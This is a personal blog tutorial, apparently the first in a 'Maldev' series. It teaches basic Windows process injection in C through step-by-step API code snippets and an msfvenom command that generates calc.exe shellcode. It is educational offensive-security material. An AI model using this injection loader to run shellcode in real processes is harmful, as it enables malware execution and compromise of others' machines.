---
title: Maldev series 1 basic payload
date: 2025-09-18 14:21:54 +1
categories: [Maldev, basic]
tags: [Maldev, Malware]
---

Hello everyone, I hope you’re doing well.

This is the first article in this Maldev series.

## My journey

I’m currently doing a master degree in cybersecurity at Oteria (Paris), and there was an optional Maldev course which I took. I knew it would be good, and oh boy, it was ! 

The course, taught by Matthieu Mollard (a senior red teamer at Mandiant / Google Cloud), was packed with content, and I learned a ton.

We used Nim to craft our malware. It’s definitely easier, but I couldn’t fully grasp the deeper mechanics behind what I was using. So, with that in mind, I went back to basics: starting from scratch with C to build malware.

## Prerequisites

Before we dive in, here’s what will make this series much smoother. You don’t need to be a wizard, but some basics will save you a lot of headaches:

- Basic C knowledge: variables, pointers, arrays, malloc/free, strings, structs, and functions.
- Assembly fundamentals: registers, syscalls.
- Shellcoding: no, I’m kidding, just use msfvenom for now :3.
- Windows internals: if you know, you know. If you don’t, you can read this famous blog post series: [0xrick’s Windows Internals]( https://0xrick.github.io/categories/#win-internals ).
- Windows debugger and tools: MSVC, WinDbg, x64dbg, PE-bear, dumpbin.

## Let’s go

Create a C project in Visual Studio, and let’s get started.

First, print “hello world!” to make sure everything works.

If it function properly, we can continue.

## The plan

What we’re doing here is called “process injection,” in its most basic form:

1. Have a target process.
2. Obtain a handle to the target process.
3. Allocate memory in that process with read/write permissions.
4. Write your shellcode into the allocated memory.
5. Change the memory protections so that region is executable.
6. Create a remote thread to run the shellcode.

## The execution of the plan

### 1. Have a target process

To have a target process, we can either launch a process, get its PID, then pass it as an argument to our malware, or we can create the process ourselves. Because we’re here to learn, we’ll create the new process in our code :3

We’ll use `CreateProcess` from the Windows API.

---  

<aside>
💡

Just to clarify: `CreateProcess` is a macro that calls either `CreateProcessA` or `CreateProcessW`. It resolves to the `W` (UTF-16) version when your project is compiled with `UNICODE`. Using the `W` version is generally preferred for correct handling of non-ASCII paths.

</aside>

---  

Open your new best friend the ✨ Windows API documentation ✨ :

[CreateProcessW function (processthreadsapi.h) - Win32 apps](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw)

After a quick overview of the function, the documentation shows the **syntax**, what the **function** **returns**, and what its **parameters** are.

![Screenshot 2025-09-21 130410.png](https://raw.githubusercontent.com/WinDyAlphA/miscDownloads/refs/heads/main/maldev1.png)

For detailed descriptions of each parameter, scroll in the [documentation](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw).

Here is an example of a parameter of the CreateProcess function lpProcessInformation : 

![Screenshot 2025-09-21 130526.png](https://raw.githubusercontent.com/WinDyAlphA/miscDownloads/refs/heads/main/maldev2.png)

With careful reading — and maybe a few Google searches, we can figure out how to use CreateProcess.

- `lpApplicationName`: This can be `NULL`. In that case, the module name must be the first whitespace-delimited token in the `lpCommandLine` string.

- `lpCommandLine` : If `lpApplicationName` is **`NULL`**, the first white space–delimited token of the command line specifies the module name.

- `lpProcessAttributes` : If `lpProcessAttributes` is **`NULL`** or `lpSecurityDescriptor` is **`NULL`**, the process gets a default security descriptor.

- `lpThreadAttributes` : If `lpThreadAttributes` is **`NULL`**, the thread gets a default security descriptor and the handle cannot be inherited.

- `bInheritHandles` : If the parameter is **`FALSE`**, the handles are not inherited.

- `dwCreationFlags` : If the `dwCreationFlags` parameter has a value of 0:
    - The process inherits both the error mode of the caller and the parent's console.
    - The environment block for the new process is assumed to contain ANSI characters (see lpEnvironment parameter for additional information).
    - A 16-bit Windows-based application runs in a shared Virtual DOS machine (VDM).
    
- `lpEnvironment` : A pointer to the [environment block](https://learn.microsoft.com/en-us/windows/win32/procthread/environment-variables) for the new process. If this parameter is **NULL**, the new process uses the environment of the calling process.

- `lpCurrentDirectory` : If this parameter is **NULL**, the new process will have the same current drive and directory as the calling process.

- `lpStartupInfo` : A pointer to a [STARTUPINFO](https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-startupinfow) or [STARTUPINFOEX](https://learn.microsoft.com/en-us/windows/desktop/api/winbase/ns-winbase-startupinfoexw) structure

- `lpProcessInformation` : A pointer to a [PROCESS_INFORMATION](https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-process_information) structure that receives identification information about the new process.

So this is the parameters we need, 

The value of theses parameters will be something like this:

- `lpApplicationName` : **NULL**
- `lpCommandLine` : “notepad.exe”
- `lpProcessAttributes` : **NULL**
- `lpThreadAttributes` : **NULL**
- `bInheritHandles` : False
- `dwCreationFlags` : 0
- `lpEnvironment` : **NULL**
- `lpCurrentDirectory` : **NULL**
- `lpStartupInfo` : *startupInfo
- `lpProcessInformation` : *processInfo

To call our fonction we need to create :

- a `LPWSTR` string of the module name (it can be a path).
- a `STARTUPINFOW` struct, doc: [STARTUPINFO](https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-startupinfow)
- a `PROCESS_INFORMATION` struct, doc: [PROCESS_INFORMATION](https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-process_information)

```c
wchar_t cmd[] = L"notepad.exe";
LPWSTR lpCmd = cmd;
STARTUPINFOW startupInfo = { sizeof(startupInfo) };
PROCESS_INFORMATION processInfo;
BOOL processCreated = CreateProcess(NULL, "notepad.exe", NULL, NULL, 0, 0, NULL, NULL, &startupInfo, &processInfo);
```

If everything works properly we now have a new process : notepad.exe open.

### 2. Obtain a handle to the target process.

So to get a handle on the process we need to work with `OpenProcess` function from the WINAPI, 

This function takes **`dwProcessId`** as an argument, **`dwProcessId`** is basically the PID of the process.

Remember when we created our process we pass the adresse of a struct : [**PROCESS_INFORMATION](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information).**

![Screenshot 2025-09-21 130809.png](https://raw.githubusercontent.com/WinDyAlphA/miscDownloads/refs/heads/main/maldev3.png)

In this structure we can get the PID (`dwProcessId`) 

```c
DWORD pid = processInfo.dwProcessId;

HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid)
```

Now that we have a handle, we can allocate memory in this process : 

### 3. Allocate memory in that process with read/write permissions.

We need to know the amount of bytes necessary to write to the process memory. So this is basically the shellcode length. In order to craft our shellcode, we can use msfvenom : 

`msfvenom -p windows/x64/exec CMD="calc.exe" -f raw -o calc.bin`

Put this shellcode in your code like shown down below: 

```c
const byte shellcode[276] = {
    0xfc,0x48,0x83, /* ... repeat until having 276 elements ... */
    /* if you don't give 276 values, remaining data will be initialized to 0 */
};
```

So we are going to use VirtualAllocEx (refer to the [documentation](https://learn.microsoft.com/fr-fr/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) if you want to learn more).

```c
VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

### 4. Write your shellcode into the allocated memory.

Now that we have our shellcode and the memory allocated in the process to put this shellcode in, let’s write this memory. 

We are going to use `WriteProcessMemory` to do that. 

```c
SIZE_T bytesWritten = 0;
WriteProcessMemory(hProcess, allocatedMemory, shellcode, sizeof(shellcode), &bytesWritten) == 0
```

<aside>
💡

I’m not gonna talk too much about error handling here. However, you can check with a condition like this  
"!ok || bytesWritten != sizeof(shellcode)"
if you have written the entire length of the shellcode in the memory.

</aside>

### 5. Change the memory protections so that region is executable.

To change the memory permission we use `VirtualProtectEx` so that we can execute the memory region where our shellcode is.

```c
VirtualProtectEx(hProcess, allocatedMemory, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect) == 0
```

### 6. Create a remote thread to run the shellcode.

With executable memory you can create a remote thread that starts at the allocated address. 

```c
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, NULL, 0, NULL);
if (!hThread) {
    // handle error
} else {
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
}
```

And right there you have your shellcode executed ! 

If your shellcode was “open calc.exe” you now have a right to do all the calculation you want :D

![Screenshot 2025-09-20 162542.png](https://raw.githubusercontent.com/WinDyAlphA/miscDownloads/refs/heads/main/maldev4.png)

You can find the complete file here : [basic.c](https://github.com/WinDyAlphA/maldevSamples/blob/main/basic.c)

---

I’m really in love with maldev right now, so i will try my best to dig this topic and to document this.

Thanks you for reading,
Enjoy the rest of your day.